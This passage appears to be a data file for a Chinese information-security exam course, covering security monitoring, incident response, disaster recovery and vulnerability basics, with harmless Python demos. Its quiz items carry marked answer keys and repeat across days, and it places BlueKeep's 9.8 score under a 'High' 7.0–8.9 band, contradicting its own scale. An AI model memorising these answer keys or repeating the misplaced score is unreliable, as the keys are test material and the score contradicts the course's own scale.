      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-24', day: 24, week: 4, title: '安全监控',
    objectives: ['理解安全监控原理', '了解监控类型', '掌握告警管理'],
    content: '# 安全监控\n\n## 安全监控概念\n\n安全监控是通过技术手段持续监视系统和网络活动，发现安全威胁的过程。\n\n## 监控类型\n\n### 1. 网络监控\n- 流量监控\n- 异常流量检测\n- DDoS攻击检测\n\n### 2. 主机监控\n- 文件完整性监控\n- 进程监控\n- 注册表监控\n\n### 3. 应用监控\n- 登录失败监控\n- API异常调用\n- 权限提升检测\n\n### 4. 数据监控\n- 数据访问异常\n- 大量数据导出\n- 敏感数据访问\n\n## IDS/IPS\n\n### IDS（入侵检测系统）\n- 检测攻击\n- 产生告警\n- 不阻断流量\n- 监控模式：旁路\n\n### IPS（入侵防御系统）\n- 检测并阻断攻击\n- 主动防御\n- 串接部署\n\n### 检测方法\n1. **特征匹配**：已知攻击特征库\n2. **异常检测**：偏离正常基线\n3. **协议分析**：协议异常检测\n\n## SIEM系统\n\n### SIEM（安全信息和事件管理）\n- 收集多源日志\n- 关联分析\n- 统一告警\n- 合规报告\n\n### 主要功能\n- 日志聚合\n- 关联规则\n- 告警管理\n- 仪表板\n- 报告生成\n\n## 告警管理\n\n### 告警处理流程\n1. **接收告警**\n2. **初步分析**\n3. **确认/误报**\n4. **升级/处置**\n5. **关闭/记录**\n\n### 告警优化\n- 减少误报\n- 调整阈值\n- 关联告警\n- 优先级排序',
    codeExample: {
      language: 'python',
      code: ` 简单入侵检测\ndef detect_intrusion(events):\n    alerts = []\n    failed_login_count = 0\n    \n    for event in events:\n        if event["type"] == "login" and event["status"] == "fail":\n            failed_login_count += 1\n    \n    if failed_login_count >= 5:\n        alerts.append({\n            "level": "HIGH",\n            "msg": f"检测到暴力破解: {failed_login_count}次失败登录"\n        })\n    \n    return alerts\n\n# 模拟事件\nevents = [\n    {"type": "login", "status": "fail"},\n    {"type": "login", "status": "fail"},\n    {"type": "login", "status": "fail"},\n    {"type": "login", "status": "fail"},\n    {"type": "login", "status": "fail"},\n]\n\nalerts = detect_intrusion(events)\nfor alert in alerts:\n    print(f"[{alert['level']}] {alert['msg']}")`,
      description: '演示简单入侵检测',
    },
    quiz: [{"id":"q24-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q24-2","question":"以下关于安全监控的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q24-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q24-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q24-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: [{"author":"张伟","title":"安全架构设计思考","content":"CISP考试中安全架构部分的重点是理解纵深防御（Defense in Depth）原则。不要只依赖单一安全措施——好的安全架构就像洋葱，一层层包裹。实际工作中，建议每个项目都从威胁建模开始，用STRIDE方法论系统梳理风险点。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"安全运维实战心得","content":"很多人在安全运维中忽略了日志管理——这恰恰是溯源和取证的关键。建议建立集中日志平台（如ELK/Splunk），设置关键告警规则，并定期进行日志审计演练。SOC建设的第一步永远是日志标准化。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"安全管理体系建设","content":"信息安全管理不是技术人员的专属责任——它是全员参与的系统工程。PDCA循环是信息安全管理的核心框架。建议从建立资产清单开始——连自己有什么都不知道就没法保护。安全是持续改进的过程。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-25', day: 25, week: 4, title: '事件响应流程',
    objectives: ['理解事件响应概念', '了解响应流程阶段', '掌握处置方法'],
    content: '# 事件响应流程\n\n> 📋 **本节大纲**\u2003PDCERF六阶段详解(P→D→C→E→R→F,含遏制优先原则) | 事件优先级分类P0-P3 | CSIRT团队 | 证据处理\n\n## 概述\n\n事件响应（Incident Response）是安全运营的核心——当安全事件爆发，如何快速有效地"止血+清创+恢复"。PDCERF是全球公认的六阶段响应模型。CISP考试中，每阶段的任务顺序和"遏制优先于根除"的逻辑是重点。\n\n## PDCERF六阶段详解\n\n### P - 准备（Preparation）\n事前的"练兵"：组建CSIRT团队(明确各角色)、制定书面应急响应计划、部署SIEM/EDR等监控工具、建立通报机制(内部+监管部门)、**定期演练**(不演练=没计划)。准备越充分，响应越快。\n\n### D - 检测与分析（Detection & Analysis）\n从SIEM告警、用户报告、外部通报等渠道发现事件。核心工作：判断是真攻击还是误报?危害范围多大?数据是否外泄?攻击还在继续吗?关键是快速准确——误判可能导致错误处置或延误。\n\n### C - 遏制（Containment）\n**"止血"——最紧急的步骤！**\n- 短期遏制(立即)：断网/隔离服务器、封禁攻击IP、冻结被攻破账户\n- 长期遏制(后续)：加固防火墙规则、修补临时漏洞、更换凭据\n- 关键原则：遏制优先于根除——先止血，再清创。不要先花时间研究攻击手法而放任攻击持续。\n\n### E - 根除（Eradication）\n**"清创"：**彻底移除攻击者的所有痕迹——删除恶意软件/后门/Webshell、修补被利用的漏洞(CVE)、重置所有被攻破账户密码、检查是否还有其他后门。确保攻击者无法轻易再次进入。\n\n### R - 恢复（Recovery）\n从干净备份恢复数据和系统→验证完整性(哈希校验)→先恢复最关键系统→逐步上线→持续监控是否有异常→确认完全干净后宣布恢复完成。\n\n### F - 跟进（Follow-up / Lessons Learned）\n事后复盘——事件是怎么发生的?(根本原因)→我们的响应哪里做得好/不好?→流程有什么漏洞需要修复?→更新应急响应计划。形成事件报告存档。\n\n## 事件优先级分类\n\n| 级别 | 定义 | 示例 | 响应要求 |\n|------|------|------|---------|\n| P0 | 重大安全事件 | 核心系统被攻破、大规模数据泄露 | 立即响应，全团队动员 |\n| P1 | 严重事件 | 单系统被入侵、DDoS致服务中断 | 30分钟内启动响应 |\n| P2 | 一般事件 | 钓鱼邮件攻击、恶意软件感染单机 | 4小时内处置 |\n| P3 | 轻微事件 | 端口扫描告警、小幅异常流量 | 24小时内分析 |\n\n## 证据处理原则\n\n如果事件可能演变为法律诉讼，必须保护证据链：\n- **不修改原始数据：**先做磁盘镜像(mirror copy)，在原盘镜像上分析而非在原始盘上操作\n- **证据链记录(Chain of Custody)：**谁在何时接触过证据、做了什么操作——全程书面记录\n- **易失性证据优先：**先收集内存(关机即丢失)→网络连接→进程列表→最后才是硬盘\n\n## \n## 🔴 高频考点\n\n· **PDCERF六步顺序**必须背：P准备→D检测→C遏制→E根除→R恢复→F跟进\n· 最紧急步骤是**C遏制**(止血)——"遏制优先于根除"是第一条铁律\n· 取证时**易失性证据优先**：内存→网络连接→进程列表→硬盘\n## 💜 记忆口诀\n\n· **PDCERF六字**："准-检-堵-清-复-盘"\n· **最紧急**："不先清先堵——先止血再清创"\n· **取证顺序**："先内存(丢得快)→再网络→再进程→最后硬盘"\n学习建议\n- PDCERF六步顺序必须牢记：P→D→C→E→R→F\n- C(遏制)是在发现攻击后最紧急的步骤——"先止血"\n- 易失性证据优先收集是取证的基本规则',
    codeExample: {
      language: 'python',
      code: ` 事件响应状态机\nclass IncidentResponder:\n    def __init__(self):\n        self.stage = "初始状态"\n    \n    def next_stage(self):\n        stages = ["检测", "遏制", "根除", "恢复", "总结"]\n        if self.stage == "初始状态":\n            self.stage = stages[0]\n        elif self.stage in stages[:-1]:\n            self.stage = stages[stages.index(self.stage) + 1]\n        return self.stage\n    \n    def handle_event(self, event_type):\n        actions = {\n            "malware": ["隔离主机", "清除恶意软件", "更新防病毒"],\n            "phishing": ["隔离邮件", "通知用户", "更新规则"],\n            "data_leak": ["隔离系统", "溯源分析", "通知合规"]\n        }\n        return actions.get(event_type, ["分析事件", "采取措施"])\n\nir = IncidentResponder()\nprint("事件响应流程:")\nfor _ in range(5):\n    print(f" -> {ir.next_stage()}")\nprint(f"\\n勒索软件处置: {ir.handle_event('malware')}")`,
      description: '演示事件响应流程',
    },
    quiz: [{"id":"q25-1","question":"SOC的全称是什么？","options":["System Operation Center","Security Operations Center","Server Operations Console","Security Online Check"],"correctIndex":1,"explanation":"SOC是Security Operations Center的缩写。"},{"id":"q25-2","question":"应急响应PDCERF模型中，第一步是？","options":["根除（Eradication）","检测（Detection）","准备（Preparation）","恢复（Recovery）"],"correctIndex":2,"explanation":"PDCERF：准备->检测->抑制->根除->恢复->跟踪。"},{"id":"q25-3","question":"SIEM系统的主要功能不包括？","options":["日志收集和分析","安全事件关联分析","发送营销邮件","告警和报表"],"correctIndex":2,"explanation":"SIEM不负责发送营销邮件。"},{"id":"q25-4","question":"安全事件中，事件和事故的区别是？","options":["完全相同","事件是可观测现象，事故是已造成损害的事件","事件比事故严重","没有区别"],"correctIndex":1,"explanation":"事件是可能影响安全的现象，事故是已造成实际损害的安全事件。"},{"id":"q25-5","question":"应急响应中保留证据的正确顺序是？","options":["先关机保存硬盘","先保留内存镜像再保留磁盘镜像","直接格式化系统","只保留日志文件"],"correctIndex":1,"explanation":"应首先保留易失性证据（内存），再保留非易失性证据（磁盘）。"}],
    expertNotes: dayExpertNotes[22],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-26', day: 26, week: 4, title: '应急响应',
    objectives: ['理解应急响应原则', '了解常见事件处置', '掌握恢复方法'],
    content: '# 应急响应\n\n## 应急响应原则\n\n### 1. 快速响应\n- 时间越短，损失越小\n- 快速决策，快速行动\n\n### 2. 最小影响\n- 尽量减少业务中断\n- 隔离而非停机\n\n### 3. 保护证据\n- 不修改原始系统\n- 保留攻击痕迹\n- 记录所有操作\n\n### 4. 持续沟通\n- 内部通报\n- 客户沟通\n- 监管报告\n\n## 常见安全事件处置\n\n### 1. 勒索软件\n\n#### 识别\n- 文件被加密\n- 出现勒索信息\n- 大量文件重命名\n\n#### 处置\n1. 隔离受影响系统\n2. 识别感染源\n3. 评估损失\n4. 从备份恢复\n5. 修复漏洞\n\n#### 预防\n- 定期备份（离线备份）\n- 员工培训\n- 漏洞修复\n\n### 2. Web应用入侵\n\n#### 识别\n- Web Shell发现\n- 异常登录\n- 网页被篡改\n\n#### 处置\n1. 隔离Web服务器\n2. 分析攻击向量\n3. 清除Web Shell\n4. 修复漏洞\n5. 恢复网站\n\n### 3. 数据泄露\n\n#### 识别\n- 异常数据访问\n- 大量数据导出\n- 外部举报\n\n#### 处置\n1. 阻止数据继续泄露\n2. 溯源分析\n3. 通知受影响方\n4. 合规报告\n\n## 恢复策略\n\n### 1. 从备份恢复\n- 验证备份完整性\n- 恢复到新系统\n- 不覆盖原始证据\n\n### 2. 重建系统\n- 使用可信镜像\n- 重新部署应用\n- 验证系统完整性\n\n### 3. 补偿措施\n- 临时防护措施\n- 加强监控\n- 增加日志级别',
    codeExample: {
      language: 'python',
      code: ` 应急响应决策系统\ndef get_response_actions(event_type, severity):\n    actions = {\n        "ransomware": {\n            "critical": ["立即隔离系统", "断开网络", "启动应急预案"],\n            "high": ["隔离感染主机", "检查扩散情况", "准备恢复"],\n        },\n        "web_intrusion": {\n            "high": ["下线可疑服务", "检查Web Shell", "分析访问日志"],\n        },\n        "phishing": {\n            "medium": ["隔离钓鱼邮件", "通知收件人", "更新邮件规则"],\n        }\n    }\n    return actions.get(event_type, {}).get(severity, ["分析事件", "采取适当措施"])\n\n# 测试\nprint("勒索软件(严重):")\nprint(get_response_actions("ransomware", "critical"))\nprint("\\n钓鱼邮件(中):")\nprint(get_response_actions("phishing", "medium"))`,
      description: '演示应急响应决策',
    },
    quiz: [{"id":"q26-1","question":"SOC的全称是什么？","options":["System Operation Center","Security Operations Center","Server Operations Console","Security Online Check"],"correctIndex":1,"explanation":"SOC是Security Operations Center的缩写。"},{"id":"q26-2","question":"应急响应PDCERF模型中，第一步是？","options":["根除（Eradication）","检测（Detection）","准备（Preparation）","恢复（Recovery）"],"correctIndex":2,"explanation":"PDCERF：准备->检测->抑制->根除->恢复->跟踪。"},{"id":"q26-3","question":"SIEM系统的主要功能不包括？","options":["日志收集和分析","安全事件关联分析","发送营销邮件","告警和报表"],"correctIndex":2,"explanation":"SIEM不负责发送营销邮件。"},{"id":"q26-4","question":"安全事件中，事件和事故的区别是？","options":["完全相同","事件是可观测现象，事故是已造成损害的事件","事件比事故严重","没有区别"],"correctIndex":1,"explanation":"事件是可能影响安全的现象，事故是已造成实际损害的安全事件。"},{"id":"q26-5","question":"应急响应中保留证据的正确顺序是？","options":["先关机保存硬盘","先保留内存镜像再保留磁盘镜像","直接格式化系统","只保留日志文件"],"correctIndex":1,"explanation":"应首先保留易失性证据（内存），再保留非易失性证据（磁盘）。"}],
    expertNotes: dayExpertNotes[22],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-27', day: 27, week: 4, title: '灾难恢复',
    objectives: ['理解灾难恢复概念', '了解DR策略', '掌握BCP要点'],
    content: '# 灾难恢复\n\n## 基本概念\n\n### RTO（恢复时间目标）\n- 灾难发生后，多久恢复业务\n- 例如：4小时\n\n### RPO（恢复点目标）\n- 可接受的数据丢失时间\n- 例如：1小时\n\n### 关系\n- RTO越小，成本越高\n- RPO越小，数据丢失越少\n\n## 灾难类型\n\n### 1. 技术故障\n- 服务器故障\n- 网络中断\n- 数据中心故障\n\n### 2. 人为因素\n- 误操作\n- 恶意破坏\n- 内部攻击\n\n### 3. 自然灾难\n- 火灾、洪水\n- 地震、台风\n\n### 4. 安全事件\n- 勒索软件\n- 大规模入侵\n- DDoS攻击\n\n## 恢复策略\n\n### 1. 冷备（Cold Site）\n- 基础设施就绪\n- 需要部署和配置\n- RTO：数天\n- 成本低\n\n### 2. 温备（Warm Site）\n- 部分设备就绪\n- 数据定期同步\n- RTO：数小时\n- 成本中等\n\n### 3. 热备（Hot Site）\n- 实时数据同步\n- 随时可切换\n- RTO：数分钟\n- 成本高\n\n### 4. 多云/混合云\n- 跨云服务商\n- 高可用性\n- 灵活扩展\n\n## BCP（业务持续性计划）\n\n### BCP内容\n1. 风险评估\n2. 业务影响分析\n3. 恢复策略\n4. 应急组织\n5. 通信计划\n6. 测试和演练\n\n### 关键指标\n- MTBF（平均故障间隔）\n- MTTR（平均修复时间）\n\n## 备份策略\n\n### 备份类型\n1. **完全备份**：备份所有数据\n2. **增量备份**：备份自上次备份后的变化\n3. **差异备份**：备份自上次完全备份后的变化\n\n### 3-2-1原则\n- **3**份副本\n- **2**种介质\n- **1**份异地',
    codeExample: {
      language: 'python',
      code: ` RTO/RPO评估示例\ndef evaluate_dr_strategy(rto_hours, rpo_hours, budget):\n    if rto_hours <= 1 and rpo_hours <= 1:\n        level = "热备"\n    elif rto_hours <= 4 and rpo_hours <= 4:\n        level = "温备"\n    else:\n        level = "冷备"\n    \n    recommendations = {\n        "热备": ["实时数据同步", "自动故障转移", "高可用架构"],\n        "温备": ["定期数据同步", "手动/半自动切换", "快速部署能力"],\n        "冷备": ["定期备份", "详细部署文档", "演练计划"]\n    }\n    return level, recommendations[level]\n\n# 评估\nlevel, recs = evaluate_dr_strategy(rto_hours=2, rpo_hours=2, budget=100000)\nprint(f"策略级别: {level}")\nprint(f"建议措施: {', '.join(recs)}")`,
      description: '演示DR策略评估',
    },
    quiz: [{"id":"q27-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q27-2","question":"以下关于灾难恢复的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q27-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q27-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q27-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: [{"author":"张伟","title":"安全架构设计思考","content":"CISP考试中安全架构部分的重点是理解纵深防御（Defense in Depth）原则。不要只依赖单一安全措施——好的安全架构就像洋葱，一层层包裹。实际工作中，建议每个项目都从威胁建模开始，用STRIDE方法论系统梳理风险点。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"安全运维实战心得","content":"很多人在安全运维中忽略了日志管理——这恰恰是溯源和取证的关键。建议建立集中日志平台（如ELK/Splunk），设置关键告警规则，并定期进行日志审计演练。SOC建设的第一步永远是日志标准化。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"安全管理体系建设","content":"信息安全管理不是技术人员的专属责任——它是全员参与的系统工程。PDCA循环是信息安全管理的核心框架。建议从建立资产清单开始——连自己有什么都不知道就没法保护。安全是持续改进的过程。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-28', day: 28, week: 4, title: '第四周总结与测验',
    objectives: ['回顾第四周知识点', '检验学习成果', '为第五周做准备'],
    content: '# 第四周学习总结\n\n## 本周学习内容\n\n### Day 22: 安全运营概述\n- SOC职能和组成\n- 安全运营流程\n\n### Day 23: 日志管理\n- 日志类型和收集\n- ELK Stack\n- 日志分析方法\n\n### Day 24: 安全监控\n- IDS/IPS区别\n- SIEM系统\n- 告警管理\n\n### Day 25: 事件响应流程\n- 六个阶段：准备→检测→遏制→根除→恢复→总结\n- CSIRT团队\n\n### Day 26: 应急响应\n- 常见事件处置（勒索软件、Web入侵、数据泄露）\n\n### Day 27: 灾难恢复\n- RTO/RPO\n- 冷备/温备/热备\n- 3-2-1备份原则\n\n## 知识要点\n\n| 主题 | 核心内容 |\n|------|----------|\n| SOC | 7x24监控、威胁检测、事件响应 |\n| IDS/IPS | 检测vs阻断 |\n| SIEM | 日志聚合、关联分析、统一告警 |\n| RTO | 恢复时间目标 |\n| RPO | 恢复点目标 |\n| 备份 | 3-2-1原则 |\n\n## 下周预告\n\n第五周将学习漏洞与攻击：\n- 漏洞概述\n- OWASP Top 10\n- 渗透测试\n- 漏洞管理',
    quiz: [{"id":"q28-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q28-2","question":"以下关于第四周总结与测验的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q28-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q28-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q28-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: [{"author":"张伟","title":"安全架构设计思考","content":"CISP考试中安全架构部分的重点是理解纵深防御（Defense in Depth）原则。不要只依赖单一安全措施——好的安全架构就像洋葱，一层层包裹。实际工作中，建议每个项目都从威胁建模开始，用STRIDE方法论系统梳理风险点。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"安全运维实战心得","content":"很多人在安全运维中忽略了日志管理——这恰恰是溯源和取证的关键。建议建立集中日志平台（如ELK/Splunk），设置关键告警规则，并定期进行日志审计演练。SOC建设的第一步永远是日志标准化。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"安全管理体系建设","content":"信息安全管理不是技术人员的专属责任——它是全员参与的系统工程。PDCA循环是信息安全管理的核心框架。建议从建立资产清单开始——连自己有什么都不知道就没法保护。安全是持续改进的过程。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  // ========== Week 5: 漏洞与攻击 ==========
  {
    id: 'day-29', day: 29, week: 5, title: '漏洞概述',
    objectives: ['理解漏洞概念', '了解漏洞类型', '掌握漏洞生命周期'],
    content: '# 漏洞概述\n\n> 📋 **本节大纲**\u2003漏洞四大来源(软件/配置/设计/人为) | CVSS评分体系 | 漏洞生命周期 | CVE/CNVD数据库 | 零日漏洞\n\n## 什么是漏洞\n\n漏洞（Vulnerability）是信息系统在设计、实现、配置或管理中存在的弱点，可能被威胁利用以破坏系统安全性。ISO 27005定义："资产或控制中可能被威胁利用的弱点"。\n\n## 漏洞四大来源分类\n\n**1. 软件漏洞（代码缺陷）：**缓冲区溢出、SQL注入、XSS、使用不安全的函数(strcpy代替strncpy)、竞态条件。根因：开发人员的安全编码意识和技能不足。\n\n**2. 配置漏洞（部署错误）：**默认密码未改(admin/admin)、不必要的服务开启(Telnet/FTP)、云存储桶公开访问、错误权限配置。根因：缺乏安全基线检查。\n\n**3. 设计漏洞（架构缺陷）：**缺少认证机制、无权限分级、信任客户端输入而不验证、身份验证逻辑缺陷。根因：需求分析阶段未考虑安全。\n\n**4. 人为漏洞（Human Factor）：**弱密码、被社会工程学欺骗、误操作删除数据、共享账户。根因：安全意识薄弱。\n\n## CVSS评分体系（必考）\n\nCVSS v3.1将漏洞严重度分为0-10分：\n- **严重(Critical) 9.0-10.0：**可远程利用、无需用户交互、导致完全系统控制。如Log4Shell(CVE-2021-44228, 10.0)\n- **高危(High) 7.0-8.9：**需要一定条件，但影响严重。如BlueKeep(CVE-2019-0708, 9.8)\n- **中危(Medium) 4.0-6.9：**有限影响或利用条件苛刻\n- **低危(Low) 0.1-3.9：**影响小或几乎不可利用\n\n评分维度：攻击向量AV、复杂度AC、权限要求PR、用户交互UI、影响范围S、C/I/A影响\n\n## 漏洞生命周期\n\n**发现** → 研究人员/白帽/厂商发现漏洞\n**报告** → 向厂商或CVE编号机构报告（CNVD/CNNVD）\n**验证** → 厂商确认漏洞存在且可复现\n**修复** → 开发商开发补丁或缓解措施\n**披露** → 负责任披露（给厂商修复时间后再公开）vs 完全披露（立即公开）\n**用户部署** → 最终用户安装补丁或实施缓解\n\n## 关键漏洞数据库\n\n- **CVE（通用漏洞与暴露）：**MITRE运营，为每个漏洞分配全球唯一编号CVE-YYYY-NNNNN\n- **NVD（美国国家漏洞数据库）：**在CVE基础上增加CVSS评分和影响分析\n- **CNVD（国家信息安全漏洞共享平台）：**中国CNCERT运营的漏洞库\n- **CNNVD（中国国家信息安全漏洞库）：**中国信息安全测评中心运营\n\n## 零日漏洞（Zero-Day）\n\n厂商尚未发布补丁的已知漏洞。对攻击者最有价值——利用窗口期无防御。黑市价格可达百万美元(iOS零日远控)。防御：纵深防御+行为检测+最小权限——不能依赖"打补丁"。\n\n## \n## 🔴 高频考点\n\n· CVSS v3.1分值范围：**严重9.0-10.0/高危7.0-8.9/中危4.0-6.9/低危0.1-3.9**\n· CVE(唯一编号)vs NVD(加评分)vs CNVD/CNNVD(中国版)——四个漏洞库定位不同\n· 零日漏洞：厂商未发补丁的已知漏洞——纵深防御+行为检测是唯一办法\n## 💜 记忆口诀\n\n· **CVSS分值**："9-7-4-0 严重到低"\n· **生命周期**："发现→报告→验证→修复→披露→装补丁"\n学习建议\n- CVSS四个严重等级的分值范围(9.0/7.0/4.0/0.1)要记住\n- 漏洞的来源分类(软件/配置/设计/人为)比单个漏洞名称更本质\n- 负责任披露( Responsible Disclosure)是现代安全行业的基本规范',
    codeExample: {
      language: 'python',
      code: ` 漏洞严重程度评估\ndef calculate_severity(cvss_score):\n    if cvss_score >= 9.0:\n        return "严重", "立即修复"\n    elif cvss_score >= 7.0:\n        return "高危", "尽快修复"\n    elif cvss_score >= 4.0:\n        return "中危", "计划修复"\n    elif cvss_score > 0:\n        return "低危", "关注跟踪"\n    else:\n        return "无风险", "无需处理"\n\n# 测试漏洞\nvulns = [("CVE-2024-1234", 9.8), ("CVE-2024-5678", 6.5), ("CVE-2024-9012", 3.2)]\nfor cve, score in vulns:\n    level, action = calculate_severity(score)\n    print(f"{cve}: CVSS {score} -> {level}, {action}")`,
      description: '演示漏洞严重程度评估',
    },
    quiz: [{"id":"q29-1","question":"SQL注入漏洞的根本原因是什么？","options":["服务器性能不足","用户输入未经验证直接拼接到SQL语句","数据库版本过旧","网络延迟过高"],"correctIndex":1,"explanation":"SQL注入的根本原因是用户输入未经验证。"},{"id":"q29-2","question":"以下哪种方法可以有效防止XSS攻击？","options":["使用HTTP协议","对输出进行HTML实体编码","增加服务器内存","使用FTP传输"],"correctIndex":1,"explanation":"对输出进行HTML实体编码可以有效防止XSS攻击。"},{"id":"q29-3","question":"CSRF攻击利用的是什么？","options":["服务器漏洞","用户已登录的身份凭证","网络带宽","加密算法"],"correctIndex":1,"explanation":"CSRF利用用户已登录状态下的身份凭证发起恶意请求。"},{"id":"q29-4","question":"预防SQL注入最有效的方法是？","options":["使用WAF","使用参数化查询","关闭数据库端口","加密数据库"],"correctIndex":1,"explanation":"参数化查询是预防SQL注入最有效的方法。"},{"id":"q29-5","question":"OWASP Top 10(2021)中排名第一的风险是？","options":["XSS","SQL注入","失效的访问控制","安全配置错误"],"correctIndex":2,"explanation":"失效的访问控制在2021版排名第一。"}],
    expertNotes: [{"author":"陈婷","title":"Web安全攻防实战","content":"Web安全核心是理解HTTP协议和浏览器安全机制。建议先掌握同源策略和CORS工作原理，然后用Burp Suite实操OWASP Top 10的漏洞利用和防御。DVWA和WebGoat是很好的练习靶场。","url":"https://www.freebuf.com/articles/web/289123.html"},{"author":"刘洋","title":"API安全防护","content":"随着微服务和前后端分离的普及，API安全越来越重要。建议所有API实施OAuth 2.0/JWT认证、输入验证、响应过滤和API网关防护。OWASP API Security Top 10是很好的参考。","url":"https://www.anquanke.com/post/id/267890.html"},{"author":"黄磊","title":"安全编码规范","content":"安全要从代码层面做起。建议团队建立代码审查中的安全检查清单：输入验证、输出编码、参数化查询、权限检查。同时引入SAST工具自动化检测常见漏洞。","url":"https://www.anquanke.com/post/id/254321.html"}],
    recommendedTools: [
    {
      id: 'sqlmap',
      name: 'SQLMap',
      description: '自动化SQL注入漏洞检测工具',
      url: ''
    },
    {
      id: 'burpsuite',
